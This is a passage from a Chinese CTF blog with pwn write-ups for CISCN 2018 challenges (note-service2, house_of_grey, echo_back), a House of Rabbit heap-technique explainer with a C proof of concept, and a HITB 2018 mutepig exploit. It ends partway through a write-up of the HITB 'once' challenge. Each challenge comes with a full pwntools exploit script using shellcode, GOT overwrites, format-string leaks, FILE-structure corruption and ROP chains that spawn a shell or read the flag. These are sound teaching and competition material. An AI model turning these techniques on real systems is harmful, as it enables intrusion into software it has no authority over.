    <content type="text"><![CDATA[​ 拖了好久才来整理全国大学生信息安全竞赛的题解，最近都在忙着DEF CON CHINA的RHG比赛的开发，虽然最后貌似只混了一件T恤… 这次比赛本来不想打的，三、四月份的比赛略多，最后趁着五一的假期，被Misty大佬召唤过来打了一天，队伍名称是Xopowo（俄语好的意思？хорошо）。 ​ 最后做出来和复现的有三道：note-service2 、 house_of_grey 、 echo_back note-service2这道题给出的hint是 漏洞分析大致分析了一下题目，题目主要提供了add、delete两个函数： 可能很多人发现的是delete函数那里悬垂指针可被double free的漏洞，但是此题这个漏洞貌似并没有太大的用处，此题存在的问题是，在add函数中输入index时当index是负数或者一个大于预留数组的size可以越界写的问题。并且，此题对got表没有开启RELRO保护，且也没有开启NX保护，这样可以输入负数，覆写got表函数地址，劫持到我们申请的堆块上去执行。换句话说这题只是一道写shellcode的题目，由于之前刷过pwnable.tw，认出了这题是Alive Note这题，这题在pwnable.tw上是32位的题目，并且限制了仅能输入0~9A~Za~z。貌似CISCN是改成了64位。 漏洞利用具体思路我曾经写过blog： http://www.cnblogs.com/p4nda/p/7992951.html（当我发现这题的原型，在国赛期间我心机的隐藏这篇博客，然而可能并没人看...） 思路是利用malloc申请堆块的规律，虽然只能写很少的shellcode，但是可以利用jmp等跳转语句直接跳转到下一块堆块去执行，最终利用系统调用syscall拿到shell，此题我预先在第一块堆块上部署好了”/bin/sh”，劫持了free@got，此时rdi指向这个/bin/sh节省了不少步骤。 EXP123456789101112131415161718192021222324252627282930313233343536from pwn import *from ctypes import *debug = 0elf = ELF('./task_note_service2_OG37AWm')context.update(arch = 'amd64')#ciscn&#123;93707fa0f2eca125f3998d0c6fb1a932&#125;if debug: p = process('./task_note_service2_OG37AWm') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' gdb.attach(p)else: p = remote('117.78.43.123', 31128) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def add(index,content): p.recvuntil('your choice&gt;&gt;') p.sendline('1') p.recvuntil('index') p.sendline(str(index)) p.recvuntil('size') p.sendline(str(8)) p.recvuntil('content') p.send(content)add(0,'/bin/sh')add((elf.got['free']-0x2020A0)/8,asm('xor rsi,rsi')+'\x90\x90\xe9\x16')add(1,asm('push 0x3b\n pop rax')+'\x90\x90\xe9\x16')add(2,asm('xor rdx,rdx')+'\x90\x90\xe9\x16')add(3,asm('syscall')+'\x90'*5)p.recvuntil('choice')p.sendline('4')p.recvuntil('index')p.sendline('0')p.interactive() house_of_grey漏洞分析此题的逻辑比较复杂，在main函数中首先利用mmap函数分配了一块内存，再利用clone函数，以mmap动态分配的内存作为栈基址，具体启动了fn函数 在fn函数中首先利用系统沙箱禁止了大部分的系统调用，然后主要提供了4个函数。 漏洞存在于case 1中，在设置文件名称是存在溢出漏洞，可以覆盖v8变量，而v8正是case 4中read的第二个参数，因此总体来说存在内存任意写漏洞。 漏洞利用首先，可以通过读/proc/self/maps来获取各程序段的内存地址，起初以为这样就可以知道全部的内存地址，包括新启动的进程栈地址。 但在实际尝试过程中，发现fn函数的栈底并不是mmap得到内存块的结束地址，而是在其内部还有随机化。 另外还在困惑，在任意写时到底应该写在哪里… w1tcher提示我最终利用exit返回，可以劫持这个流程，但是我头铁决定将case 4中的read参数劫持到read函数的返回地址处，也就是是read自身覆写自身的返回地址… 这样在read函数结束时也就返回到了通过写入的rop中。 这种想法遇到的一个问题是如何拿到随机化的栈地址？ 此时想到另外一个文件/proc/self/mem，这个文件相当于程序内存的一个映射。在测试过程中发现，其栈起始地址与mmap内存块的结束地址相差了一个随机值，而这个随机值是有一定范围的：0xf000000~0xfffffff之间，是可以爆破的，而爆破的过程是，首先利用case 2的定位函数，预先设定一个读取内存地址的起始值，然后不断的向下读，由于程序栈中存在一个明显的字符串标识”/proc/self/mem”，当读到的数据中包含这个字符串时就可以判断找到了栈。 可以简单验证一下可行性，爆破的次数最多可以有24次（共可以进行30次操作，其他操作占有次数），24*100000 = 2400000 = 0x249f00 ， 而可能的范围是0x1000000 其概率为0.1430511474609375，是可以接受的。 另外此题的坑点还有系统调用的限制，最终可以通过open(‘/home/ctf/flag’) read(6,buf,0x100) puts(buf)读出。 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125#coding:utf-8from pwn import *from ctypes import *debug = 0elf = ELF('./task_house_P4U73bf')#ciscn&#123;57de0cd00899090b7193b2a99508e6db&#125;if debug: p = process('./task_house_P4U73bf') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('117.78.43.123', 32619) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #off = 0x001b0000 context.log_level = 'debug'p.recvuntil('Y/n')p.sendline('y')p.recvuntil('Exit')p.sendline('1')p.recvuntil('finding?')p.sendline('/proc/self/maps')p.recvuntil('Exit')p.sendline('3')p.recvuntil('get?')p.sendline('10000')p.recvuntil('something:\n')pie = int('0x'+p.recvuntil('-')[:-1],16)print '[+] pie:',hex(pie)while 1: a = p.recvline() if 'heap' in a: a = p.recvline() stack_start = int(a.split('-')[0],16) stack_end = int((a.split('-')[1]).split(' ')[0],16) print '[+] stack_start:',hex(stack_start) print '[+] stack_end:',hex(stack_end) breakwhile 1: a = p.recvline() if 'libc' in a: libc.address = int(a.split('-')[0],16) print '[+] system:',hex(libc.symbols['system']) breakcanary = 0p.recvuntil('Exit')p.sendline('1')p.recvuntil('finding?')p.sendline('/proc/self/mem')p.recvuntil('Exit')p.sendline('2')p.recvuntil('you?')stack_guess = 0xf800000p.sendline(str(stack_end - stack_guess - 24*100000))print '[+] offset from ',hex( stack_guess + 24*100000),'to',hex(stack_guess)print '[+] from ',hex(stack_end - stack_guess - 24*100000),'to',hex(stack_end - stack_guess)for i in range(0,24): p.recvuntil('Exit') p.sendline('3') p.recvuntil('get?') p.sendline('100000') p.recvuntil('something:\n') tmp = p.recvuntil('1.Find ')[:-7] if '/mem' in tmp: print '[+++] find' print tmp.split('/proc/self/mem')[0] canary = u64(tmp.split('/proc/self/mem')[0][-0x48:-0x40]) breakstack_address = stack_end - stack_guess - 24*100000 + i *100000 + len(tmp.split('/proc/self/mem')[0])if canary==0: print '[-] fail' exit(0)print '[+] canary :',hex(canary)print '[+] stack :',hex(stack_address)p.recvuntil('Exit')p.sendline('1')p.recvuntil('finding?')p.sendline('/proc/self/mem'+'\x00'*(0x18-14)+p64(stack_address-56))p.recvuntil('Exit')p.sendline('4')p.recvuntil('content')rop =p64(pie+0x0000000000001823)+p64(stack_address-56+0x100)+p64(pie+0x0000000000001821)+p64(0)+p64(0)+p64(pie+elf.symbols['open'])+p64(pie+0x0000000000001823)+p64(6)+p64(pie+0x0000000000001821)+p64(stack_address-56+0x100)+p64(stack_address-56+0x100)+p64(pie+elf.symbols['read'])+p64(pie+0x0000000000001823)+p64(stack_address-56+0x100)+p64(pie+elf.symbols['puts'])rop +='a'*(0x100-len(rop))rop += '/home/ctf/flag\0'p.sendline(rop)p.interactive()'''hex(-0x7fb165afd580 +0x7fb174d53000) 0xf255a80hex(-0x7f810afe4db0 + 0x7f811af62000) 0xff7d250hex(-0x7fe3844beeb0 + 0x7fe394428000) 0xff69150hex(-0x7f73844633a0 + 0x7f73940a9000) 0xfc45c600x0000000000001823 : pop rdi ; ret0x0000000000001821 : pop rsi ; pop r15 ; ret 00000000 23 28 99 7f 32 56 00 00 20 2f 20 00 00 00 00 00 │#(··│2V··│ / ·│····│ 00000010 00 0b 00 00 00 00 00 00 23 28 99 7f 32 56 00 00 │····│····│#(··│2V··│ 00000020 70 2f 20 00 00 00 00 00 00 0b 00 00 00 00 00 00 │p/ ·│····│····│····│ 00000030 23 28 99 7f 32 56 00 00 30 2f 20 00 00 00 00 00 │#(··│2V··│0/ ·│····│ 00000040 00 0b 00 00 00 00 00 00 0a [DEBUG] Sent 0x49 bytes: 00000000 23 28 99 7f 32 56 00 00 20 2f 20 00 00 00 00 00 │#(··│2V··│ / ·│····│ 00000010 00 0b 00 00 00 00 00 00 23 28 99 7f 32 56 00 00 │····│····│#(··│2V··│ 00000020 70 2f 20 00 00 00 00 00 00 0b 00 00 00 00 00 00 │p/ ·│····│····│····│ 00000030 23 28 99 7f 32 56 00 00 30 2f 20 00 00 00 00 00 │#(··│2V··│0/ ·│····│ 00000040 00 0b 00 00 00 00 00 00 0a │····│····│·│ 00000049[*] Switching to interactive mode: [DEBUG] Received 0x40 bytes: '/home/ctf/run.sh: line 2: 84 Segmentation fault ./house\n'/home/ctf/run.sh: line 2: 84 Segmentation fault ./house[*] Got EOF while reading in interactive$ ''' echo back此题当时没有做出来就和本科室友出去玩了… 后来回来复现了一下 漏洞分析总体来说题目逻辑简单，漏洞也比较明显——格式化字符串，但是格式化字符串的长度是有限制的： 首先利用格式化字符串可以泄露PIE、栈、libc地址。存在一个setname函数，可以由用户输入一个长度为7的值，由此步骤和格式化字符串漏洞，可以达到一个向任意地址写一个四字节或两字节或单字节的\x00。 向任意地址写单字节的\x00还是比较敏感的，在去年的WHCTF 2017 中出现过一道向_IO_buf_base末位写\x00的利用方法，但是给定的libc是libc-2.24.so，此题虽然给的是libc-2.23.so，同样利用这个方法。 漏洞利用该种利用方法利用的是文件IO中的几个指针在scanf中的应用。之前针对IO的利用也写过一些，比如House of Orange，那种利用方法比较复杂，是与堆结合，之前写过一篇丢到了看雪上：https://bbs.pediy.com/thread-223334.htm 这个攻击方法没有那么复杂，但是需要读scanf的源码。 首先scanf调用了 _IO_vfscanf ，并且提供增加了操作的文件指针stdin，这个指针很熟悉，是0号文件。其结构体是： 其中红圈内的指针是本次漏洞利用主角 继续追踪_IO_vfscanf 函数，其具体实现是内联函数_IO_vfscanf_internal，其内部实现了scanf对于格式化的操作，其中比较重要的是inchar()，这个函数是读入用户输入数据的函数。此函数最终调用了_IO_new_file_underflow进行输入，这个最底层的操作。 查看函数逻辑 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970int_IO_new_file_underflow (_IO_FILE *fp)&#123; _IO_ssize_t count;#if 0 /* SysV does not make this test; take it out for compatibility */ if (fp-&gt;_flags &amp; _IO_EOF_SEEN) return (EOF);#endif if (fp-&gt;_flags &amp; _IO_NO_READS) &#123; fp-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; &#125; if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) return *(unsigned char *) fp-&gt;_IO_read_ptr; if (fp-&gt;_IO_buf_base == NULL) &#123; /* Maybe we already have a push back pointer. */ if (fp-&gt;_IO_save_base != NULL) &#123; free (fp-&gt;_IO_save_base); fp-&gt;_flags &amp;= ~_IO_IN_BACKUP; &#125; _IO_doallocbuf (fp); &#125; if (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED)) &#123;#if 0 _IO_flush_all_linebuffered ();#else _IO_acquire_lock (_IO_stdout); if ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF)) == (_IO_LINKED | _IO_LINE_BUF)) _IO_OVERFLOW (_IO_stdout, EOF); _IO_release_lock (_IO_stdout);#endif &#125; _IO_switch_to_get_mode (fp); fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base; fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base; fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_buf_base; count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base); if (count &lt;= 0) &#123; if (count == 0) fp-&gt;_flags |= _IO_EOF_SEEN; else fp-&gt;_flags |= _IO_ERR_SEEN, count = 0; &#125; fp-&gt;_IO_read_end += count; if (count == 0) &#123; fp-&gt;_offset = _IO_pos_BAD; return EOF; &#125; if (fp-&gt;_offset != _IO_pos_BAD) _IO_pos_adjust (fp-&gt;_offset, count); return *(unsigned char *) fp-&gt;_IO_read_ptr;&#125;libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow) 当_IO_read_ptr &lt; _IO_read_end时，函数直接返回_IO_read_ptr。反之，则会进行一系列赋值操作，最终调用read的系统调用向_IO_buf_base中读入数据。可以想到，当可以控制_IO_buf_base的值就可以达到任意地址写的目的了。 题目中可以利用是因为当覆盖为00时，指针恰好指向了stdin内部地址，并且可以再次覆写_IO_buf_base进一步造成内存任意写，而在scanf后面跟了一个getchar()函数，每次调用这个函数是会导致_IO_read_ptr++。 由于在覆写_IO_base_buf时，会造成_IO_read_end+=输入的size，不断利用getchar可以使得_IO_read_ptr逐渐增大到_IO_read_end，最终再次调用read系统调用，达到内存任意写的目的。第二次覆写_IO_buf_base的内容为函数返回地址，写入ROP即可拿到shell EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#coding:utf-8from pwn import *from ctypes import *debug = 1elf = ELF('./echo_back')if debug: p = process('./echo_back') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' #gdb.attach(p)else: p = remote('117.78.43.123', 32619) libc = ELF('./libc.so.6') #off = 0x001b0000 context.log_level = 'debug'def set_name(name): p.recvuntil('choice&gt;&gt;') p.sendline('1') p.recvuntil('name') p.send(name)def echo(content): p.recvuntil('choice&gt;&gt;') p.sendline('2') p.recvuntil('length:') p.sendline('-1') p.send(content)echo('%12$p\n')p.recvuntil('anonymous say:')stack_addr = int(p.recvline()[:-1],16)print '[+] stack :',hex(stack_addr)echo('%13$p\n')p.recvuntil('anonymous say:')pie = int(p.recvline()[:-1],16)-0xd08print '[+] pie :',hex(pie)echo('%19$p\n')p.recvuntil('anonymous say:')libc.address = int(p.recvline()[:-1],16)-240-libc.symbols['__libc_start_main']print '[+] system :',hex(libc.symbols['system'])set_name(p64(libc.address + 0x3c4918)[:-1])echo('%16$hhn')p.recvuntil('choice&gt;&gt;')p.sendline('2') p.recvuntil('length:')padding = p64(libc.address+0x3c4963)*3 + p64(stack_addr-0x28)+p64(stack_addr+0x10)p.send(padding)p.sendline('')for i in range(len(padding)-1): p.recvuntil('choice&gt;&gt;') p.sendline('2') p.recvuntil('length:') p.sendline('')p.recvuntil('choice&gt;&gt;')p.sendline('2') p.recvuntil('length:')rop = p64(pie+0x0000000000000d93)+p64(next(libc.search('/bin/sh')))+p64(libc.symbols['system'])p.sendline(rop)p.sendline('')p.interactive()'''Gadgets information============================================================0x0000000000000d8c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000000d8e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000000d90 : pop r14 ; pop r15 ; ret0x0000000000000d92 : pop r15 ; ret0x0000000000000d8b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000000d8f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000000940 : pop rbp ; ret0x0000000000000d93 : pop rdi ; ret0x0000000000000d91 : pop rsi ; pop r15 ; ret0x0000000000000d8d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000000861 : ret''']]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[House Of Rabbit 原理]]></title>
    <url>%2F2018%2F04%2F18%2Fhouse-of-rabbit%2F</url>
    <content type="text"><![CDATA[House Of Rabbit是一个比较新的堆利用姿势，在满足条件的情况下，可以绕过堆块的地址随机化保护（ASLR）达到任意地址分配的目的。 所需条件 可以分配任意大小的堆块并且释放，主要包括三类fastbin大小的堆块、smallbin大小的堆块、较大的堆块（用于分配到任意地址处） 存在一块已知地址的内存空间，并可以任意写至少0x20长度的字节 存在fastbin dup、UAF等漏洞，用于劫持fastbin的fd指针。 当存在上述三个条件时，即可使用House Of Rabbit攻击方法，Rabbit的含义大概是可以JUMP到任意地址（日本人的冷幽默？？） 利用方法使用样例在此处有可以使用的样例文件，来自 shift-crops ，如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798/* PoC of House of Rabbit Tested in Ubuntu 14.04, 16.04 (64bit). Yutaro Shimizu @shift_crops 2017/09/14*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char target[0x10] = "Hello, World!";unsigned long gbuf[6] = &#123;0&#125;;int main(void)&#123; void *p, *fast, *small, *fake; char *victim; printf( "This is PoC of House of Rabbit\n" "This technique bypassing Heap ASLR without leaking address, " "and make it possible to overwrite a variable located at an arbitary address.\n" "Jump like a rabbit and get an accurate address by malloc! :)\n\n"); // 1. Make 'av-&gt;system_mem &gt; 0xa00000' printf("1. Make 'av-&gt;system_mem &gt; 0xa00000'\n"); p = malloc(0xa00000); printf(" Allocate 0xa00000 byte by mmap at %p, and free.\n", p); free(p); p = malloc(0xa00000); printf(" Allocate 0xa00000 byte in heap at %p, and free.\n", p); free(p); printf(" Then, the value of 'av-&gt;system_mem' became larger than 0xa00000.\n\n"); // 2. Free fast chunk and link to fastbins printf("2. Free fast chunk and link to fastbins\n"); fast = malloc(0x10); // any size in fastbins is ok small = malloc(0x80); printf( " Allocate fast chunk and small chunk.\n" " fast = %p\n" " small = %p\n", fast, small); free(fast); printf(" Free fast chunk.\n\n"); // 3. Make fake_chunk on .bss printf("3. Make fake_chunk on .bss\n"); gbuf[1] = 0x11; gbuf[3] = 0xfffffffffffffff1; printf( " fake_chunk1 (size : 0x%lx) is at %p\n" " fake_chunk2 (size : 0x%lx) is at %p\n\n" , gbuf[3], &amp;gbuf[2], gbuf[1], &amp;gbuf[0]); // VULNERABILITY // use after free or fastbins dup etc... fake = &amp;gbuf[2]; printf( "VULNERABILITY (e.g. UAF)\n" " *fast = %p\n" , fake); *(unsigned long**)fast = fake; printf(" fastbins list : [%p, %p, %p]\n\n", fast-0x10, fake, *(void **)(fake+0x10)); // 4. call malloc_consolidate printf( "4. call malloc_consolidate\n" " Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n" , small, fake); free(small); // 5. Link unsorted bins to appropriate list printf( "5. Link unsorted bins to appropriate list\n" " Rewrite fake_chunk1's size to 0xa0001 to bypass 'size &lt; av-&gt;system_mem' check.\n"); gbuf[3] = 0xa00001; malloc(0xa00000); printf( " Allocate huge chunk.\n" " Now, fake_chunk1 link to largebin[126](max).\n" " Then, write fake_chunk1's size back to 0xfffffffffffffff1.\n\n"); gbuf[3] = 0xfffffffffffffff1; // 6. Overwrite targer variable printf( "6. Overwrite targer variable on .data\n" " target is at %p\n" " Before : %s\n" , &amp;target, target); malloc((void*)&amp;target-(void*)(gbuf+2)-0x20); victim = malloc(0x10); printf(" Allocate 0x10 byte at %p, and overwrite.\n", victim); strcpy(victim, "Hacked!!"); printf(" After : %s\n", target);&#125; 下面对这个利用方法进行分步解析 步骤1 增大malloc函数中 mmap分配阈值当通过malloc函数分配内存时，当超过某特定阈值时，堆块会由mmap来分配，但同时会改变该阈值。具体改变和分配代码如下： 分配代码： 12345if ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp;(mp_.n_mmaps &lt; mp_.n_mmaps_max)) &#123; …… &#125; 阈值改变： 123unsigned long sum;sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;atomic_max (&amp;mp_.max_mmapped_mem, sum); 因此在第一阶段 12345678910// 1. Make 'av-&gt;system_mem &gt; 0xa00000'printf("1. Make 'av-&gt;system_mem &gt; 0xa00000'\n");p = malloc(0xa00000);printf(" Allocate 0xa00000 byte by mmap at %p, and free.\n", p);free(p);p = malloc(0xa00000);printf(" Allocate 0xa00000 byte in heap at %p, and free.\n", p);free(p);printf(" Then, the value of 'av-&gt;system_mem' became larger than 0xa00000.\n\n"); 第一次程序malloc(0xa00000)时，堆块由mmap分配，并且mp_.max_mmaped_mem变成0xa10000，当free以后再次malloc(0xa00000)时，系统会首先通过sbrk扩大top块进行分配，当最后一次free后，top大小变成0xa20c31 &gt; 0xa00000 步骤2 申请小堆块并放入fastbin首先malloc(0x20) ，再次malloc(0x80)，这两块都是由top直接切割得到，保证small bin大小的块挨着top。 123456789// 2. Free fast chunk and link to fastbinsprintf("2. Free fast chunk and link to fastbins\n");fast = malloc(0x20); // any size in fastbins is ok small = malloc(0x80);printf( " Allocate fast chunk and small chunk.\n" " fast = %p\n" " small = %p\n", fast, small);free(fast);printf(" Free fast chunk.\n\n"); 此时，对应的堆结构是： 步骤3 伪造堆块并劫持至fastbin在一个已知地址的内存处（如未开启PIE的程序BSS段）伪造两个连续的堆块，一个堆块大小是0x11，紧挨着是0xfffffffffffffff1，这样可以保证后续操作可以覆盖到任意地址。更重要的是这个0x11的小块即是大块的前块，也是大块的后块，可以保证在malloc中通过检查。 利用漏洞劫持fastbin，将大小为0xfffffffffffffff1的堆块，挂到fastbin上去。 1234567891011121314151617// 3. Make fake_chunk on .bssprintf("3. Make fake_chunk on .bss\n");gbuf[1] = 0x11; gbuf[3] = 0xfffffffffffffff1; printf( " fake_chunk1 (size : 0x%lx) is at %p\n" " fake_chunk2 (size : 0x%lx) is at %p\n\n" , gbuf[3], &amp;gbuf[2], gbuf[1], &amp;gbuf[0]);// VULNERABILITY// use after free or fastbins dup etc...fake = &amp;gbuf[2];printf( "VULNERABILITY (e.g. UAF)\n" " *fast = %p\n" , fake);*(unsigned long**)fast = fake;printf(" fastbins list : [%p, %p, %p]\n\n", fast-0x10, fake, *(void **)(fake+0x10)); 此时，堆块状态如下： 步骤4 利用malloc_consolidate使伪造堆块进入unsorted bin在free函数中，当释放的块大于 65536时，会触发malloc_consolidate，这个函数用于对fastbin合并，并放到unsorted bin中。 触发代码如下：(malloc.c 4071) 12345678#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)... if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123; if (have_fastchunks(av)) malloc_consolidate(av);... 而在malloc_consolidate()中，会循环处理各fastbin堆块，当堆块与top相邻时，与top合并。否则，将堆块放入unsorted bin中，并设置pre_size和pre_inuse位，此时较小的堆块变成 0xffffffffffffffff0 0x10 1234567891011121314151617181920212223242526272829if (nextchunk != av-&gt;top) &#123; nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) &#123; size += nextsize; unlink(av, nextchunk, bck, fwd); &#125; else clear_inuse_bit_at_offset(nextchunk, 0); first_unsorted = unsorted_bin-&gt;fd; unsorted_bin-&gt;fd = p; first_unsorted-&gt;bk = p; if (!in_smallbin_range (size)) &#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; &#125; set_head(p, size | PREV_INUSE); p-&gt;bk = unsorted_bin; p-&gt;fd = first_unsorted; set_foot(p, size);&#125;else &#123; size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p;&#125; 对应步骤代码如下： 12345// 4. call malloc_consolidateprintf( "4. call malloc_consolidate\n" " Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n" , small, fake);free(small); 步骤结束后，内存分布如下： 步骤5 分配内存 使伪造堆块进入large bin当伪造的堆块进入unsorted bin时，并不能达到目的，需要进一步使堆块进入large bin，此时需要将伪造的堆块大小改为0xa00001，其目的有两个，1是绕过程序对unsorted bin中内存块大小小于av-&gt;system_mem的检测；2是使程序放入large bin的最后一块（&gt;0x800000) malloc检测如下（malloc.c 3473） 1234567891011for (;; ) &#123; int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123; bck = victim-&gt;bk; if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, "malloc(): memory corruption", chunk2mem (victim), av); size = chunksize (victim); 步骤代码如下： 123456789// 5. Link unsorted bins to appropriate list printf( &quot;5. Link unsorted bins to appropriate list\n&quot; &quot; Rewrite fake_chunk1&apos;s size to 0xa00001 to bypass &apos;size &lt; av-&gt;system_mem&apos; check.\n&quot;); gbuf[3] = 0xa00001; malloc(0xa00000); printf( &quot; Allocate huge chunk.\n&quot; &quot; Now, fake_chunk1 link to largebin[126](max).\n&quot; &quot; Then, write fake_chunk1&apos;s size back to 0xfffffffffffffff1.\n\n&quot;); gbuf[3] = 0xfffffffffffffff1; 最终，程序的堆块布局如下： 步骤6 任意内存分配当伪造堆块进入large bin最后一个队列时，将伪造堆块的大小改回0xfffffffffffffff1，此时在申请任意长度的地址，使堆块地址上溢到当前堆地址的低地址位置，从而可以分配到任意地址，达到内存任意写的目的。 12345678910111213// 6. Overwrite targer variableprintf( &quot;6. Overwrite targer variable on .data\n&quot; &quot; target is at %p\n&quot; &quot; Before : %s\n&quot; , &amp;target, target);malloc((void*)&amp;target-(void*)(gbuf+2)-0x20);victim = malloc(0x10);printf(&quot; Allocate 0x10 byte at %p, and overwrite.\n&quot;, victim);strcpy(victim, &quot;Hacked!!&quot;);printf(&quot; After : %s\n&quot;, target); 相关题目HITB CTF 2018 mutepig题目提供分配大小为0x10、0x80、0xa00000、0xffffffffffffff70大小的堆块，并且没有开启PIE保护，还存在UAF漏洞，完全满足该利用方法需求，通过将内存地址分配回bss段低地址部分的堆地址指针数组，覆写数组内容为free@got，利用编辑功能，将其内容改为system@plt，在free时可以拿到shell。 坑点在于此题没有输出，调试比较坑。另外需要注意利用方法中提到的当大堆块释放到unsorted bin时，小堆块的值会有改动。 EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#coding:utf-8from pwn import *import timedebug = 0elf=ELF('mutepig')if debug: p = process('./mutepig') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('47.75.128.158', 9999) #libc = ELF('./libc.so.6') context.log_level = 'debug' #libc = ELF('./libc-2.23.so') #off = 0x001b0000def add(type,content): p.sendline('1') p.sendline(str(type)) p.send(content) time.sleep(1)def free(index): p.sendline('2') p.sendline(str(index))def edit(index,content1,content2): p.sendline('3') p.sendline(str(index)) p.send(content1) p.send(content2) time.sleep(1)bss_list = 0x06020C0bss_can_be_edit = 0x602120add(3,'p4nda_0') #0free(0)add(3,'p4nda_1') #1free(1)add(1,'p4nda_2') #2add(2,'p4nda_3') #3free(2)edit(2,p64(bss_can_be_edit+0x10)[:-1],p64(0)+p64(0x11)+p64(0)+p64(0xfffffffffffffff1)+'\0'*15)free(3)edit(2,p64(0)[:-1],p64(0)+p64(0x11)+p64(0)+p64(0xA00001))add(3,'p4nda_4') #4edit(2,p64(bss_can_be_edit+0x10)[:-1],p64(0xfffffffffffffff0)+p64(0x10)+p64(0)+p64(0xfffffffffffffff1))#add(0x3419,'p4nda_5') #5add(1,p64(elf.got['free'])[:-1])edit(0,p64(elf.symbols['system'])[:-1],'/bin/sh\0')edit(6,'/bin/sh','/bin/sh\0')free(6)p.interactive() 题目]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HITB gsec CTF Qual 2018 部分PWN题解]]></title>
    <url>%2F2018%2F04%2F17%2Fhitb2018%2F</url>
    <content type="text"><![CDATA[once此题共有四个函数，自行实现了一个类似于unsorted bin的数据结构，其结构体如下： 123456700000000 bin struc ; (sizeof=0x20, mappedto_1)00000000 field_0 dq ?00000008 field_8 dd ?0000000C field_C dd ?00000010 fd dq ?00000018 bk dq ?00000020 bin ends 其中第一个函数，是初始化函数，首先申请了一个0x20的数据块作为第一个堆块。 12345678910111213141516171819202122__int64 funtion1()&#123; __int64 v0; // ST18_8@1 bin *ptr; // rax@1 bin *mem; // ST10_8@1 __int64 result; // rax@1 __int64 v4; // rcx@1 v0 = *MK_FP(__FS__, 40LL); ptr = (bin *)malloc(0x20uLL); ptr-&gt;fd = 0LL; ptr-&gt;bk = 0LL; mem = (bin *)bss_once_mem; bss_once_mem = ptr; ptr-&gt;fd = (__int64)&amp;unk_202020; ptr-&gt;bk = (__int64)mem; mem-&gt;fd = (__int64)ptr; puts("suceess."); result = 0LL; v4 = *MK_FP(__FS__, 40LL) ^ v0; return result;&#125; 第二个函数，可以编辑上述堆块，造成可以覆写fd、bk指针， 1234567891011121314151617181920int funtion2()&#123; int result; // eax@2 __int64 v1; // rdx@4 __int64 v2; // [sp+8h] [bp-8h]@1 v2 = *MK_FP(__FS__, 40LL); if ( bss_once_flag == 1 ) &#123; result = -1; &#125; else &#123; write_(bss_once_mem, 0x20u); bss_once_flag = 1; result = puts("success."); &#125; v1 = *MK_FP(__FS__, 40LL) ^ v2; return result;&#125; 第三个函数，实现了一个unlink操作，由于第二个函数导致内存任意写 123456789101112131415161718192021int funtion3()&#123; int result; // eax@2 __int64 v1; // rcx@4 __int64 v2; // [sp+8h] [bp-8h]@1 v2 = *MK_FP(__FS__, 40LL); if ( bss_once_flag_2 == 1 ) &#123; result = -1; &#125; else &#123; bss_once_mem = (bin *)bss_once_mem-&gt;bk; bss_once_mem-&gt;fd = (__int64)&amp;unk_202020; bss_once_flag_2 = 1; result = puts("success."); &#125; v1 = *MK_FP(__FS__, 40LL) ^ v2; return result;&#125; 第四个函数中可以申请任意大的堆块，并对这个堆块申请、释放。 此题中开启了全部保护，因此无法获悉其内部任何地址。 本题解题思路是： 1 根据给定的功能泄露libc地址 2 使用1功能初始链 3 利用4功能申请一个大堆块备用 4 利用2功能，修改小堆块中的fd指针的末位字节（由于bss地址未知），使其地址指向bss段上ptr指针-0x10 5 利用3功能unlink，使bss段上ptr指针写入 PIE + 0x202020的地址 6 